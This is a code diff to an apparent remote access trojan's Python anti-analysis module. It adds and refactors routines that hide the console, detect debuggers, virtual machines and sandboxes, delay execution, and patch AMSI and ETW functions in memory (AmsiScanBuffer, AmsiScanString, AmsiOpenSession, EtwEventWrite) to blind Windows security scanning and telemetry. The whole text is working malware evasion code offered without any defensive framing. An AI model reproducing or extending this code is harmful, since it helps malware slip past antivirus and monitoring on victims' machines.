@@ -6,6 +6,7 @@ import socket
 import ctypes
 import psutil
 import logging
+from ctypes import wintypes
 
 log = logging.getLogger("rat")
 
@@ -16,8 +17,8 @@ def hide_console() -> None:
         hwnd = ctypes.windll.kernel32.GetConsoleWindow()
         if hwnd:
             ctypes.windll.user32.ShowWindow(hwnd, 0)
-    except Exception as e:
-        log.debug("hide_console: %s", e)
+    except Exception:
+        pass
 
 def is_debugger_present() -> bool:
     try:
@@ -35,14 +36,14 @@ def is_debugger_present() -> bool:
     return False
 
 def check_vm_artifacts() -> bool:
-    vm_processes = (
+    vm_procs = (
         "vmtoolsd.exe", "vmwaretray.exe", "vboxservice.exe", "vboxtray.exe",
         "qemu-ga.exe", "prl_tools.exe", "xenservice.exe"
     )
     try:
         for p in psutil.process_iter(['name']):
             name = (p.info['name'] or "").lower()
-            if any(vm in name for vm in vm_processes):
+            if any(vm in name for vm in vm_procs):
                 return True
     except Exception:
         pass
@@ -83,35 +84,43 @@ def sandbox_check() -> bool:
         return True
     return False
 
+def _patch_mem(addr, data: bytes) -> bool:
+    try:
+        old = ctypes.c_ulong()
+        if not ctypes.windll.kernel32.VirtualProtect(addr, len(data), 0x40, ctypes.byref(old)):
+            return False
+        ctypes.memmove(addr, data, len(data))
+        ctypes.windll.kernel32.VirtualProtect(addr, len(data), old.value, ctypes.byref(old))
+        return True
+    except Exception:
+        return False
+
 def patch_amsi_etw() -> None:
     try:
-        ntdll = ctypes.windll.kernel32.LoadLibraryW("ntdll.dll")
-        etw = ctypes.windll.kernel32.GetProcAddress(ntdll, b"EtwEventWrite")
+        k32 = ctypes.windll.kernel32
+        ntdll = k32.LoadLibraryW("ntdll.dll")
+        etw = k32.GetProcAddress(ntdll, b"EtwEventWrite")
         if etw:
-            old = ctypes.c_ulong()
-            ctypes.windll.kernel32.VirtualProtect(etw, 1, 0x40, ctypes.byref(old))
-            ctypes.memmove(etw, b"\xC3", 1)
-            ctypes.windll.kernel32.VirtualProtect(etw, 1, old.value, ctypes.byref(old))
-        amsi = ctypes.windll.kernel32.LoadLibraryW("amsi.dll")
+            _patch_mem(etw, b"\xC3")
+        amsi = k32.LoadLibraryW("amsi.dll")
         if amsi:
-            scan = ctypes.windll.kernel32.GetProcAddress(amsi, b"AmsiScanBuffer")
-            if scan:
-                old = ctypes.c_ulong()
-                ctypes.windll.kernel32.VirtualProtect(scan, 6, 0x40, ctypes.byref(old))
-                ctypes.memmove(scan, b"\xB8\x57\x00\x07\x80\xC3", 6)
-                ctypes.windll.kernel32.VirtualProtect(scan, 6, old.value, ctypes.byref(old))
-            opensess = ctypes.windll.kernel32.GetProcAddress(amsi, b"AmsiOpenSession")
+            for name in (b"AmsiScanBuffer", b"AmsiScanString"):
+                addr = k32.GetProcAddress(amsi, name)
+                if addr:
+                    _patch_mem(addr, b"\xB8\x57\x00\x07\x80\xC3")
+            opensess = k32.GetProcAddress(amsi, b"AmsiOpenSession")
             if opensess:
-                old = ctypes.c_ulong()
-                ctypes.windll.kernel32.VirtualProtect(opensess, 1, 0x40, ctypes.byref(old))
-                ctypes.memmove(opensess, b"\xC3", 1)
-                ctypes.windll.kernel32.VirtualProtect(opensess, 1, old.value, ctypes.byref(old))
+                _patch_mem(opensess, b"\xC3")
     except Exception as e:
         log.debug("patch_amsi_etw: %s", e)
 
+def startup_delay() -> None:
+    time.sleep(random.randint(8, 20))
+
 def anti_analysis() -> None:
     hide_console()
+    startup_delay()
     if sandbox_check():
-        log.warning("sandbox indicators detected, delaying")
+        log.warning("sandbox indicators detected, extra delay")
         time.sleep(random.randint(30, 90))
     patch_amsi_etw()
